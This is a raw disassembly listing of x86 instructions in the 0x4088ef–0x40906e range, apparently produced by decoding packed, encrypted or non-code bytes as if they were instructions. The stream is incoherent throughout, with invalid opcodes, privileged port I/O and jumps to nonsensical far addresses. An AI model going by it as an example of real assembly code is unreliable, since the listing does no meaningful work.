  4088ef:	mov    esi,0x3fbfc123
  4088f4:	mov    edx,0x6b66673e
  4088f9:	sub    cl,bl
  4088fb:	and    ecx,esp
  4088fd:	mov    ch,0xa6
  4088ff:	mov    ds:0x468ea317,eax
  408904:	int    0xfb
  408906:	jmp    0x4088eb
  408908:	pop    ss
  408909:	std    
  40890a:	inc    esp
  40890b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40890c:	sub    esp,DWORD PTR [ebp-0x4d831dcc]
  408912:	cwde   
  408913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408914:	jmp    0x4088ef
  408916:	in     al,dx
  408917:	test   ebx,0x4987d78c
  40891d:	push   edx
  40891e:	mov    ds:0xd10dc11c,ax
  408924:	sub    DWORD PTR es:[edx-0x45cebaf1],esi
  40892b:	mov    al,0x83
  40892d:	dec    esp
  40892e:	mov    edx,0x7313b40a
  408933:	xchg   ebp,eax
  408934:	dec    edi
  408935:	aad    0x48
  408937:	cmp    al,cl
  408939:	mov    eax,ds:0x139f3cc0
  40893e:	aaa    
  40893f:	or     al,0x67
  408941:	popf   
  408942:	pop    ds
  408943:	xor    eax,0xe34cc1e
  408948:	sbb    DWORD PTR [ebp+0x64ed155d],0x9ee087f8
  408952:	bound  esi,QWORD PTR [edi]
  408954:	push   edi
  408955:	pushf  
  408956:	sti    
  408957:	sbb    DWORD PTR [esp+ebx*2],esp
  40895a:	inc    esp
  40895b:	js     0x40893a
  40895d:	(bad)  
  40895e:	sub    BYTE PTR [ebx+0x56],ch
  408961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408962:	(bad)  
  408963:	mov    ds:0xaf3b1d1,eax
  408968:	ret    
  408969:	push   DWORD PTR ds:0x3a312123
  40896f:	shl    BYTE PTR [eax-0x14],0x3d
  408973:	and    DWORD PTR [esi-0xa],eax
  408976:	loop   0x408905
  408978:	mov    edi,0x990dea58
  40897d:	mov    eax,0xd4614e3c
  408982:	sbb    DWORD PTR [ebp-0x5b],edx
  408985:	adc    al,0xf4
  408987:	push   esp
  408988:	pop    ebx
  408989:	mov    ebx,0x44d08796
  40898e:	mov    ebx,0x9e16f9da
  408993:	push   cs
  408994:	dec    eax
  408995:	push   es
  408996:	das    
  408997:	mov    bl,0x12
  408999:	outs   dx,DWORD PTR ds:[esi]
  40899a:	inc    edi
  40899b:	cs enter 0xbb8e,0x55
  4089a0:	mov    bl,0xbe
  4089a2:	fadd   st(0),st
  4089a4:	and    edx,DWORD PTR [ebx+edi*1]
  4089a7:	adc    al,0x5e
  4089a9:	das    
  4089aa:	sub    edx,edi
  4089ac:	fs cmc 
  4089ae:	mov    ds:0x1640fa0d,eax
  4089b3:	mov    al,ds:0xb2861e81
  4089b8:	std    
  4089b9:	push   0x69
  4089bb:	aad    0xdc
  4089bd:	outs   dx,BYTE PTR ds:[esi]
  4089be:	and    BYTE PTR [edi+0xb],dl
  4089c1:	sbb    eax,0xb29137d7
  4089c6:	fild   QWORD PTR [ebp+0x70]
  4089c9:	and    eax,0x520557fd
  4089ce:	loop   0x408a12
  4089d0:	push   0xde73cee2
  4089d5:	nop
  4089d6:	inc    ecx
  4089d7:	mov    edi,0x516963b5
  4089dc:	push   ds
  4089dd:	pop    esp
  4089de:	inc    edi
  4089df:	(bad)  
  4089e0:	sub    eax,0x1f23827d
  4089e5:	mov    ebx,0x6e261d9b
  4089ea:	out    0x6e,al
  4089ec:	cmp    bh,BYTE PTR [esi+0x28]
  4089ef:	and    dl,ch
  4089f1:	(bad)  
  4089f2:	or     ebp,DWORD PTR [ebp-0x784bccaa]
  4089f8:	pop    es
  4089f9:	and    DWORD PTR [esi-0x4d],ebp
  4089fc:	fs xchg edi,eax
  4089fe:	(bad)  
  4089ff:	cmp    esi,DWORD PTR [esi-0x5888082b]
  408a05:	add    DWORD PTR [ecx-0x3a],edx
  408a08:	and    ebx,DWORD PTR [edi+ebp*1]
  408a0b:	xchg   BYTE PTR [ebx-0x23],al
  408a0e:	ret    0x6152
  408a11:	mov    ah,0xc3
  408a13:	mov    ecx,0x3a857fa6
  408a18:	and    BYTE PTR [esi-0x31ead6d1],0xb4
  408a1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a20:	(bad)  
  408a22:	push   esp
  408a23:	mov    ebx,esi
  408a25:	lahf   
  408a26:	aam    0xc4
  408a28:	mov    edx,0x4b3b95dc
  408a2d:	xchg   esp,eax
  408a2e:	pusha  
  408a2f:	out    dx,al
  408a30:	fidivr DWORD PTR [edx+0x6cc8dcce]
  408a36:	and    DWORD PTR [edx+edx*1+0x6e215d1c],ebp
  408a3d:	into   
  408a3e:	push   ss
  408a3f:	mov    esi,0x860b1294
  408a44:	mov    ebx,0x8989e0ce
  408a49:	push   ds
  408a4a:	lea    eax,[esi-0x54]
  408a4d:	invd   
  408a4f:	sub    dl,BYTE PTR [edx]
  408a51:	xlat   BYTE PTR ds:[ebx]
  408a52:	jmp    0xcc79210d
  408a57:	sub    ecx,eax
  408a59:	cmp    DWORD PTR [esi],ebx
  408a5b:	nop
  408a5c:	(bad)  [edx+0x2]
  408a5f:	xadd   esp,edx
  408a62:	pop    esp
  408a63:	pop    ebp
  408a64:	sbb    BYTE PTR [edi+0x5de5224e],dl
  408a6a:	imul   ebx,ecx,0xae327c3d
  408a70:	xor    eax,0x8afc268e
  408a75:	add    al,bl
  408a77:	popf   
  408a78:	inc    esp
  408a79:	pop    es
  408a7a:	jb     0x408a6b
  408a7c:	lock add dl,cl
  408a7f:	push   ds
  408a80:	repz jbe 0x408aeb
  408a83:	and    eax,0xe53d0b90
  408a88:	add    bh,BYTE PTR [edx-0x39]
  408a8b:	add    al,0x3c
  408a8d:	js     0x408aa0
  408a8f:	bound  ecx,QWORD PTR [edx]
  408a91:	push   ebp
  408a92:	arpl   WORD PTR [edx+0x69],cx
  408a95:	pop    ecx
  408a96:	out    dx,al
  408a97:	lods   al,BYTE PTR ds:[esi]
  408a98:	xchg   ebp,eax
  408a99:	rcl    DWORD PTR ds:0xc3e3868d,0x6b
  408aa0:	sbb    eax,0x47d55a48
  408aa5:	ret    0xbbf7
  408aa8:	xchg   ebx,eax
  408aa9:	xor    al,0x3e
  408aab:	inc    ebp
  408aac:	or     ch,BYTE PTR [edi+ecx*8]
  408aaf:	cmp    al,0xf9
  408ab1:	push   edx
  408ab2:	pop    eax
  408ab3:	lahf   
  408ab4:	sub    eax,0xe266a282
  408ab9:	aas    
  408aba:	inc    ebx
  408abb:	mov    eax,ds:0x7ca5f933
  408ac0:	cli    
  408ac1:	xchg   edx,eax
  408ac2:	ins    DWORD PTR es:[edi],dx
  408ac3:	push   ds
  408ac4:	pusha  
  408ac5:	aam    0x12
  408ac7:	iret   
  408ac8:	ins    BYTE PTR es:[edi],dx
  408ac9:	push   ebx
  408aca:	and    esp,DWORD PTR [ecx-0x406b85fd]
  408ad0:	xchg   BYTE PTR [eax],al
  408ad2:	fstp   TBYTE PTR [ebp-0x1f1f65ea]
  408ad8:	loope  0x408b06
  408ada:	ja     0x408ae5
  408adc:	xchg   edx,eax
  408add:	mov    ds:0xdc3bb802,eax
  408ae2:	addr16 (bad) 
  408ae4:	ins    BYTE PTR es:[edi],dx
  408ae5:	test   BYTE PTR [ecx],ch
  408ae7:	pop    edx
  408ae8:	sbb    dl,BYTE PTR [ebp+0x72]
  408aeb:	mov    eax,0x544bee47
  408af0:	dec    esi
  408af1:	nop
  408af2:	push   edi
  408af3:	add    BYTE PTR ds:0xdf10abb2,bl
  408af9:	call   0x6620:0xf0fb85d4
  408b00:	xchg   ebp,eax
  408b01:	mov    ch,BYTE PTR [eax]
  408b03:	cmp    DWORD PTR [ebp+0xc],ebx
  408b06:	lods   eax,DWORD PTR ds:[esi]
  408b07:	in     al,0x97
  408b09:	(bad)  
  408b0a:	inc    ecx
  408b0b:	adc    ecx,0xffffffc6
  408b0e:	pop    ds
  408b0f:	daa    
  408b10:	les    ebp,FWORD PTR [esi+0x42]
  408b13:	mov    ecx,0x71773e6c
  408b18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b19:	xor    BYTE PTR [edx+edi*2],0xbb
  408b1d:	std    
  408b1e:	stc    
  408b1f:	mov    ds:0x65055b86,eax
  408b24:	mov    al,0xab
  408b26:	dec    eax
  408b27:	sub    DWORD PTR [esi],ebp
  408b29:	(bad)  
  408b2a:	mov    dl,0x7
  408b2c:	ficom  WORD PTR [esi-0x6a]
  408b2f:	das    
  408b30:	stos   BYTE PTR es:[edi],al
  408b31:	xchg   esp,eax
  408b32:	pop    eax
  408b33:	arpl   WORD PTR [edi+0x6303f2d4],di
  408b39:	adc    DWORD PTR [edi],esi
  408b3b:	cmp    BYTE PTR ds:0xa1c8ba8,bh
  408b41:	mov    esi,0xcfda017b
  408b46:	lods   eax,DWORD PTR ds:[esi]
  408b47:	int3   
  408b48:	test   eax,0xc2237f12
  408b4d:	lock xchg edi,eax
  408b4f:	push   es
  408b50:	dec    ecx
  408b51:	fs loop 0x408ad7
  408b54:	shl    DWORD PTR [esi],1
  408b56:	outs   dx,BYTE PTR ds:[esi]
  408b57:	inc    ebp
  408b58:	fcomp  st(5)
  408b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b5b:	mov    eax,ds:0x2b2bbb6c
  408b60:	inc    ebp
  408b61:	jp     0x408b01
  408b63:	pop    ecx
  408b64:	mov    BYTE PTR [eax],bl
  408b66:	mov    dh,0xe2
  408b68:	add    ebp,DWORD PTR [ebx]
  408b6a:	in     eax,dx
  408b6b:	push   esp
  408b6c:	xchg   ecx,eax
  408b6d:	push   ecx
  408b6e:	adc    dh,dl
  408b70:	pusha  
  408b71:	sub    edx,DWORD PTR [edx-0x25]
  408b74:	sub    edx,DWORD PTR [ebx-0xeae246a]
  408b7a:	inc    esp
  408b7b:	stos   DWORD PTR es:[edi],eax
  408b7c:	addr16 dec esi
  408b7e:	push   cs
  408b7f:	aam    0x25
  408b81:	mov    al,ds:0x5bec4668
  408b86:	(bad)  
  408b88:	lahf   
  408b89:	pusha  
  408b8a:	cmp    eax,DWORD PTR [ebp-0x64]
  408b8d:	into   
  408b8e:	push   esp
  408b8f:	lahf   
  408b90:	and    bh,BYTE PTR [edi-0x3]
  408b93:	ja     0x408b7f
  408b95:	stc    
  408b96:	push   edx
  408b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b98:	retf   0x227a
  408b9b:	ins    DWORD PTR es:[edi],dx
  408b9c:	xor    eax,0xf2fd4b9b
  408ba1:	or     eax,0xa9b39a9e
  408ba6:	rcr    dl,cl
  408ba8:	data16 into 
  408baa:	push   ebp
  408bab:	push   ebx
  408bac:	lock pusha 
  408bae:	pop    edx
  408baf:	int    0xf
  408bb1:	add    dl,ch
  408bb3:	push   ds
  408bb4:	gs ins BYTE PTR es:[edi],dx
  408bb6:	cli    
  408bb7:	rcr    DWORD PTR [eax+0x5386b1ba],cl
  408bbd:	sub    DWORD PTR [ecx+edi*1-0x58b7a8eb],ecx
  408bc4:	loop   0x408bfe
  408bc6:	int3   
  408bc7:	stos   DWORD PTR es:[edi],eax
  408bc8:	ja     0x408bf7
  408bca:	xor    ch,ah
  408bcc:	sbb    edi,esp
  408bce:	retf   
  408bcf:	jl     0x408c36
  408bd1:	stc    
  408bd2:	(bad)  
  408bd3:	jo     0x408b5c
  408bd5:	push   eax
  408bd6:	push   esi
  408bd7:	cwde   
  408bd8:	sub    DWORD PTR [eax],esi
  408bda:	stc    
  408bdb:	xor    BYTE PTR es:[edx],bh
  408bde:	int3   
  408bdf:	push   cs
  408be0:	outs   dx,BYTE PTR ds:[esi]
  408be1:	jg     0x408bf6
  408be3:	pop    es
  408be4:	cmp    al,0x79
  408be6:	lods   al,BYTE PTR ds:[esi]
  408be7:	stos   DWORD PTR es:[edi],eax
  408be8:	out    dx,al
  408be9:	rcr    DWORD PTR ds:0xd8c846f4,0x7c
  408bf0:	xlat   BYTE PTR ds:[ebx]
  408bf1:	push   ebx
  408bf2:	mov    ds:0x7852e22a,eax
  408bf7:	xor    eax,0x607dd47b
  408bfc:	not    dl
  408bfe:	and    eax,0x8faedb04
  408c03:	addr16 dec esi
  408c05:	jmp    0x15bc:0xad7700bf
  408c0c:	cmc    
  408c0d:	das    
  408c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c0f:	addr16 jmp 0x408c88
  408c12:	adc    esp,edx
  408c14:	repz pop ebp
  408c16:	add    BYTE PTR [ebx],al
  408c18:	add    eax,DWORD PTR [edx+eax*4]
  408c1b:	push   edi
  408c1c:	fwait
  408c1d:	popa   
  408c1e:	inc    eax
  408c1f:	outs   dx,DWORD PTR ds:[esi]
  408c20:	and    dh,bh
  408c22:	jmp    0xc88:0x1882dad9
  408c29:	pop    esp
  408c2a:	xchg   ebx,ecx
  408c2c:	xor    BYTE PTR [edi-0x11],bh
  408c2f:	dec    esp
  408c30:	in     eax,0xa0
  408c32:	xchg   ebp,eax
  408c33:	int3   
  408c34:	outs   dx,BYTE PTR ds:[esi]
  408c35:	and    DWORD PTR [ebx+0x53d2f6e7],esi
  408c3b:	mov    dl,0x25
  408c3d:	pop    esp
  408c3e:	jp     0x408c48
  408c40:	int    0x14
  408c42:	push   ecx
  408c43:	mov    ds:0xb45a31f0,eax
  408c48:	retf   0xbf7d
  408c4b:	xchg   BYTE PTR [eax],dh
  408c4d:	cmp    eax,0xaf98d46c
  408c52:	pop    edi
  408c53:	jno    0x408cb1
  408c55:	pop    ss
  408c56:	mov    ecx,0xbe8b35c1
  408c5c:	adc    BYTE PTR [ecx+esi*4+0x42],al
  408c60:	(bad)  
  408c62:	sub    al,0x5c
  408c64:	dec    esi
  408c65:	pop    ss
  408c66:	jp     0x408c1f
  408c68:	sahf   
  408c69:	loopne 0x408bff
  408c6b:	pop    edi
  408c6c:	mov    DWORD PTR [ecx+ecx*8],ebx
  408c6f:	jmp    0x649397b7
  408c74:	pop    esp
  408c75:	mov    BYTE PTR ds:0xbfa6c59f,dh
  408c7b:	cmp    ch,al
  408c7d:	and    DWORD PTR [ebx],eax
  408c7f:	inc    esp
  408c80:	push   esp
  408c81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c82:	int    0x8
  408c84:	shr    DWORD PTR [ebx],cl
  408c86:	or     bl,BYTE PTR [edx-0x6f]
  408c89:	and    DWORD PTR [eax],edi
  408c8b:	fcmovnbe st,st(4)
  408c8d:	call   0x1e98:0x3efada68
  408c94:	push   edx
  408c95:	xor    bh,BYTE PTR [ecx]
  408c97:	add    esi,ebp
  408c99:	pop    ecx
  408c9a:	xchg   edx,eax
  408c9b:	or     ebp,DWORD PTR [ecx]
  408c9d:	mov    eax,0x1ee6a495
  408ca2:	cli    
  408ca3:	and    eax,0x4336caf8
  408ca8:	xrelease mov BYTE PTR [edx-0x525d037e],0x85
  408cb0:	mov    BYTE PTR [esp+edi*1-0x272f05e1],dh
  408cb7:	jae    0x408c5c
  408cb9:	das    
  408cba:	xchg   esp,eax
  408cbb:	ins    DWORD PTR es:[edi],dx
  408cbc:	cmp    eax,DWORD PTR [edi+eax*2]
  408cbf:	out    0xcc,eax
  408cc1:	out    0xd2,al
  408cc3:	cwde   
  408cc4:	sbb    DWORD PTR [eax],esp
  408cc6:	loop   0x408d33
  408cc8:	sbb    DWORD PTR [eax-0x64574806],0x32
  408ccf:	les    ebx,FWORD PTR [edx+0x68]
  408cd2:	cs (bad) 
  408cd4:	fisubr DWORD PTR [ebp+0x55]
  408cd7:	dec    ebx
  408cd8:	dec    ebp
  408cd9:	sahf   
  408cda:	jmp    0x9882:0xe29b6f4c
  408ce1:	mov    ch,0x81
  408ce3:	push   edi
  408ce4:	sbb    ebx,eax
  408ce6:	jne    0x408c86
  408ce8:	push   cs
  408ce9:	sub    ecx,DWORD PTR [eax+0x57]
  408cec:	imul   esp,DWORD PTR [esi],0x4f
  408cef:	pop    edi
  408cf0:	xor    eax,0x9083da19
  408cf5:	cmp    DWORD PTR ds:0x57e51b93,esi
  408cfb:	xchg   ebp,eax
  408cfc:	jmp    0x36b4:0xac30cd36
  408d03:	jmp    0x86b9:0x6df07104
  408d0a:	jo     0x408c9d
  408d0c:	std    
  408d0d:	ficomp WORD PTR [eax+0x71]
  408d10:	push   0xd
  408d12:	cmp    al,0xf7
  408d14:	xor    dl,BYTE PTR [ebp+0x75d5991b]
  408d1a:	popa   
  408d1b:	js     0x408d92
  408d1d:	and    DWORD PTR [ebx-0x260510d3],ecx
  408d23:	inc    ecx
  408d24:	ins    BYTE PTR es:[edi],dx
  408d25:	lods   eax,DWORD PTR ds:[esi]
  408d26:	lahf   
  408d27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d28:	or     bh,BYTE PTR cs:[esp+eax*8-0xa4da5f0]
  408d30:	jmp    0xededca08
  408d35:	and    al,0x20
  408d37:	push   0xffffffdb
  408d39:	dec    ebx
  408d3a:	aad    0x4a
  408d3c:	mov    bh,0x9d
  408d3e:	daa    
  408d3f:	pop    ebx
  408d40:	sub    BYTE PTR [eax-0x1b06e15f],ah
  408d46:	dec    esi
  408d47:	jbe    0x408d2f
  408d49:	mov    eax,0xd846f626
  408d4e:	cmp    eax,0xd192cc04
  408d53:	dec    ebp
  408d54:	sub    eax,0xd8bb1725
  408d59:	add    esi,eax
  408d5b:	out    dx,al
  408d5c:	add    ebx,ebx
  408d5e:	ror    bl,cl
  408d60:	mov    ebp,0xf8939d38
  408d65:	sub    eax,0xb41eab57
  408d6a:	out    dx,al
  408d6b:	xchg   esi,eax
  408d6c:	dec    esp
  408d6d:	ret    0x298c
  408d70:	push   edx
  408d71:	mov    al,0xc2
  408d73:	add    eax,0xca9e48de
  408d78:	mov    bh,0xfb
  408d7a:	sbb    ecx,DWORD PTR [ecx+0x46]
  408d7d:	iret   
  408d7e:	and    BYTE PTR [edi-0x38],0x23
  408d82:	aad    0x5c
  408d84:	inc    edx
  408d85:	add    BYTE PTR [ebx],ah
  408d87:	loop   0x408dca
  408d89:	cmp    al,0x7a
  408d8b:	jo     0x408e09
  408d8d:	enter  0x8909,0x51
  408d91:	ins    BYTE PTR es:[edi],dx
  408d92:	inc    ebx
  408d93:	gs ja  0x408dd8
  408d96:	dec    edx
  408d97:	mov    cl,BYTE PTR [ebx-0x56]
  408d9a:	daa    
  408d9b:	xchg   edx,eax
  408d9c:	call   0x603a239d
  408da1:	mov    ah,0x8c
  408da3:	dec    ebp
  408da4:	xor    dl,ah
  408da6:	not    al
  408da8:	out    0x8a,eax
  408daa:	mov    ds:0xbe8e32e4,al
  408daf:	ja     0x408e0d
  408db1:	sbb    eax,esp
  408db3:	add    ecx,DWORD PTR [edx]
  408db5:	dec    edx
  408db6:	jl     0x408dcd
  408db8:	mov    WORD PTR [edi+0x5a],ss
  408dbb:	jns    0x408d6c
  408dbd:	es pop esp
  408dbf:	fstp   QWORD PTR [edi]
  408dc1:	cs inc esi
  408dc3:	sub    DWORD PTR ds:0x7ea6a996,ebx
  408dc9:	or     BYTE PTR [eax+0xf],cl
  408dcc:	and    al,0xb1
  408dce:	push   ss
  408dcf:	jns    0x408de5
  408dd1:	mov    ch,BYTE PTR [edx]
  408dd3:	ficom  DWORD PTR [eax]
  408dd5:	ror    BYTE PTR [ecx+esi*1],1
  408dd8:	jae    0x408e0c
  408dda:	push   ds
  408ddb:	push   cs
  408ddc:	lea    ebx,[ecx-0x66]
  408ddf:	cmp    al,0xf4
  408de1:	in     al,dx
  408de2:	lods   al,BYTE PTR ds:[esi]
  408de3:	pop    ecx
  408de4:	lods   eax,DWORD PTR ss:[esi]
  408de6:	aaa    
  408de7:	or     al,0x3b
  408de9:	(bad)  
  408dea:	mov    ebx,0xccefe40b
  408def:	cmc    
  408df0:	push   esp
  408df1:	xor    al,0xfa
  408df3:	pop    esp
  408df4:	dec    esp
  408df5:	adc    al,0x18
  408df7:	sub    esp,DWORD PTR [edi]
  408df9:	mov    ah,0x60
  408dfb:	jno    0x408da2
  408dfd:	mov    eax,ds:0x79b68d08
  408e02:	(bad)  
  408e03:	js     0x408e66
  408e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e06:	dec    ebp
  408e07:	jg     0x408e6e
  408e09:	or     DWORD PTR [edi+0x76af9ca1],0xffffffd4
  408e10:	xor    eax,0x5a3b9fc1
  408e15:	addr16 aaa 
  408e17:	clc    
  408e18:	(bad)  
  408e19:	ror    dl,1
  408e1b:	pushf  
  408e1c:	cmp    DWORD PTR [esi],0x98e7b125
  408e22:	ins    DWORD PTR es:[edi],dx
  408e23:	and    dh,al
  408e25:	adc    BYTE PTR [ebp+edi*8-0x4855c241],cl
  408e2c:	mov    DWORD PTR [ebp-0x256fba6f],ebp
  408e32:	div    BYTE PTR [esi+0x6af51ca1]
  408e38:	xchg   esp,eax
  408e39:	test   DWORD PTR [esi-0x79],edx
  408e3c:	pop    ss
  408e3d:	adc    DWORD PTR [ebx],esp
  408e3f:	mov    ds:0xd0a72ee1,eax
  408e44:	push   eax
  408e45:	sar    DWORD PTR [ecx+eax*1+0x4e13dba3],1
  408e4c:	xchg   esi,eax
  408e4d:	lods   al,BYTE PTR ds:[esi]
  408e4e:	mov    dl,0xd8
  408e50:	shr    DWORD PTR [esp+ecx*4],1
  408e53:	and    ch,BYTE PTR [edi+0x639b03cd]
  408e59:	out    dx,al
  408e5a:	xchg   ebx,eax
  408e5b:	dec    edi
  408e5c:	mov    bl,BYTE PTR [edx-0x25]
  408e5f:	pop    es
  408e60:	push   ds
  408e61:	int3   
  408e62:	mov    ebp,0x641b4786
  408e67:	push   ebp
  408e68:	imul   esp,DWORD PTR [ebx+0x7875f2de],0x67
  408e6f:	xchg   ecx,eax
  408e70:	popf   
  408e71:	jo     0x408e7b
  408e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e74:	fbld   TBYTE PTR [edx-0x2acb134f]
  408e7a:	mov    esi,0xef6ca9ec
  408e7f:	push   esp
  408e80:	mov    esi,0xabf47679
  408e85:	(bad)  
  408e86:	loopne 0x408e0d
  408e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e89:	(bad)  
  408e8a:	jmp    0x740a:0xf4379b94
  408e91:	pop    ebx
  408e92:	sub    eax,0xeb746e75
  408e97:	lds    edi,FWORD PTR [esi+0x36]
  408e9a:	pop    esi
  408e9b:	imul   edi,DWORD PTR [eax],0x56
  408e9e:	sub    BYTE PTR [edi+edx*2],dh
  408ea1:	mov    edi,0xc8a23cd5
  408ea6:	lock je 0x408e63
  408ea9:	int    0x6c
  408eab:	scas   al,BYTE PTR es:[edi]
  408eac:	dec    ecx
  408ead:	inc    ebx
  408eae:	xor    al,0xda
  408eb0:	into   
  408eb1:	std    
  408eb2:	pop    esi
  408eb3:	push   cs
  408eb4:	arpl   WORD PTR [ebx+0x69],bx
  408eb7:	imul   ebx,DWORD PTR [esi+0x45cfeefc],0x516b25bf
  408ec1:	cwde   
  408ec2:	(bad)  
  408ec3:	cmp    edi,DWORD PTR [esi+eiz*8+0x72337c0f]
  408eca:	and    al,0xcf
  408ecc:	les    esp,FWORD PTR ds:0xc70c7c73
  408ed2:	(bad)  
  408ed3:	adc    ch,BYTE PTR [esi+eiz*2-0x6a]
  408ed7:	dec    ebp
  408ed8:	dec    BYTE PTR [ecx-0x453143ab]
  408ede:	cld    
  408edf:	pusha  
  408ee0:	jo     0x408f50
  408ee2:	out    dx,eax
  408ee3:	fnstenv [edi]
  408ee5:	push   esp
  408ee6:	push   ebp
  408ee7:	in     al,0x15
  408ee9:	inc    edx
  408eea:	push   0xf600bb86
  408eef:	fdivr  DWORD PTR [edi-0x42]
  408ef2:	xchg   ecx,eax
  408ef3:	pusha  
  408ef4:	mov    ah,0x27
  408ef6:	inc    edi
  408ef7:	mov    DWORD PTR [ebx+0x2d7cd752],0x62fff7da
  408f01:	sub    DWORD PTR [edx-0x53b9c315],edi
  408f07:	mov    ecx,0xb0928914
  408f0c:	in     al,dx
  408f0d:	ss loope 0x408ea4
  408f10:	fldcw  WORD PTR [edx+eax*2-0x6287681c]
  408f17:	retf   
  408f18:	nop
  408f19:	loope  0x408f0a
  408f1b:	nop
  408f1c:	push   DWORD PTR [ebx+0x46]
  408f1f:	inc    DWORD PTR [ecx-0x20]
  408f22:	mov    ah,0x39
  408f24:	test   DWORD PTR [eax-0x10],ebx
  408f27:	push   esp
  408f28:	stos   BYTE PTR es:[edi],al
  408f29:	mov    ds:0x89d42f10,eax
  408f2e:	pop    ecx
  408f2f:	in     eax,0xc6
  408f31:	jnp    0x408f45
  408f33:	pop    es
  408f34:	mov    bl,0x53
  408f36:	push   ebx
  408f37:	out    0xed,eax
  408f39:	push   ebx
  408f3a:	mov    bl,0x3c
  408f3c:	sbb    DWORD PTR [edi-0x61],0xffffff88
  408f40:	stos   BYTE PTR es:[edi],al
  408f41:	or     cl,dh
  408f43:	or     esp,DWORD PTR [edi]
  408f45:	out    dx,eax
  408f46:	jno    0x408fb3
  408f48:	call   0x19c9:0x7bc40014
  408f4f:	cld    
  408f50:	jg     0x408fae
  408f52:	xchg   ebx,eax
  408f53:	repnz aam 0x9c
  408f56:	add    ebx,DWORD PTR [esi+0x20]
  408f59:	jbe    0x408f29
  408f5b:	or     al,0x78
  408f5d:	xor    eax,0x543facbd
  408f62:	mov    ch,dl
  408f64:	cmp    BYTE PTR [esi],dl
  408f66:	mov    ah,0x29
  408f68:	inc    ebp
  408f69:	int3   
  408f6a:	mov    dh,BYTE PTR [ebx+0x6a8e8aae]
  408f70:	dec    eax
  408f71:	icebp  
  408f72:	ret    
  408f73:	clc    
  408f74:	retf   0x335
  408f77:	(bad)  
  408f78:	pop    ebx
  408f79:	sub    ebp,ecx
  408f7b:	mov    dl,0x28
  408f7d:	mov    WORD PTR [edi-0x62d8020b],?
  408f83:	ins    DWORD PTR es:[edi],dx
  408f84:	xor    DWORD PTR [ebx-0x2d],ecx
  408f87:	mov    es,WORD PTR [edx-0x4a6b7eb8]
  408f8d:	std    
  408f8e:	sub    al,0xfc
  408f90:	clc    
  408f91:	dec    BYTE PTR [edx+0x6d9bfcd0]
  408f97:	xor    edx,0xd92a5cc5
  408f9d:	call   0x79aae792
  408fa2:	cmp    dl,BYTE PTR [ecx+0x30]
  408fa5:	dec    edi
  408fa6:	jnp    0x408f41
  408fa8:	lds    eax,FWORD PTR [bp+di+0x3b]
  408fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fad:	sub    edx,eax
  408faf:	scas   eax,DWORD PTR es:[edi]
  408fb0:	es sti 
  408fb2:	arpl   WORD PTR fs:[ecx-0x60],sp
  408fb6:	inc    esi
  408fb7:	dec    ebx
  408fb8:	jae    0x409022
  408fba:	and    BYTE PTR [ecx],dl
  408fbc:	sbb    ebx,eax
  408fbe:	push   cs
  408fbf:	ficom  DWORD PTR [ebp+0x7d]
  408fc2:	adc    ch,al
  408fc4:	mov    ecx,0xd7c26d4d
  408fc9:	ror    BYTE PTR [ebp-0x29],cl
  408fcc:	sar    BYTE PTR [ecx+0x5791130b],0x92
  408fd3:	sub    al,0xe7
  408fd5:	(bad)  
  408fd6:	shl    DWORD PTR ds:0x991eec96,0x9f
  408fdd:	imul   BYTE PTR [eax+ebp*4+0x6]
  408fe1:	mov    dl,BYTE PTR [ecx+0x72]
  408fe4:	cmp    bl,BYTE PTR [edi]
  408fe6:	not    DWORD PTR [ecx+eiz*8-0x345fe91e]
  408fed:	jl     0x409005
  408fef:	mov    ch,0xd8
  408ff1:	jo     0x408fec
  408ff3:	sbb    cl,al
  408ff5:	fs pusha 
  408ff7:	mov    ?,WORD PTR [ebp+0x1d561436]
  408ffd:	cli    
  408ffe:	dec    ecx
  408fff:	xchg   ebx,eax
  409000:	les    esp,FWORD PTR [ebx]
  409002:	adc    al,BYTE PTR [ebx-0xe]
  409005:	adc    dl,BYTE PTR [esi]
  409007:	retf   0x4a75
  40900a:	lahf   
  40900b:	dec    ecx
  40900c:	jae    0x409073
  40900e:	mov    ds:0x9683bc7e,eax
  409013:	or     DWORD PTR [edx+0x6a],ecx
  409016:	aas    
  409017:	pop    esi
  409018:	cdq    
  409019:	jmp    0xfd596e0b
  40901e:	icebp  
  40901f:	imul   ebx,DWORD PTR [edx],0xba2d544
  409025:	repnz sbb BYTE PTR [ebp+0x1b],0x6c
  40902a:	je     0x409008
  40902c:	inc    esi
  40902d:	test   BYTE PTR [eax+0x2c],bh
  409030:	aad    0xc1
  409032:	fcmovnu st,st(7)
  409034:	xchg   di,ax
  409036:	xchg   esi,eax
  409037:	xchg   edx,eax
  409038:	pop    es
  409039:	aaa    
  40903a:	xchg   esp,eax
  40903b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40903c:	scas   eax,DWORD PTR es:[edi]
  40903d:	(bad)  
  40903e:	and    eax,0x7fac6714
  409043:	fimul  WORD PTR [ebx+0x69]
  409046:	pop    ebx
  409047:	loopne 0x408fdb
  409049:	sub    eax,0xe7d97a52
  40904e:	inc    ecx
  40904f:	dec    edi
  409050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409051:	xchg   edx,eax
  409052:	mul    DWORD PTR [eax]
  409054:	jo     0x40909c
  409056:	cmp    eax,0x88f7dd3c
  40905b:	hlt    
  40905c:	cmp    BYTE PTR [esi],bh
  40905e:	push   es
  40905f:	ss in  al,0x47
  409062:	push   esp
  409063:	ins    BYTE PTR es:[edi],dx
  409064:	adc    BYTE PTR [edi+0x77],bh
  409067:	pop    edx
  409068:	sbb    esi,DWORD PTR [ecx-0x2596bd2]
  40906e:	cmp    DWORD PTR [ecx-0x637ca51f],0xb390ff7d
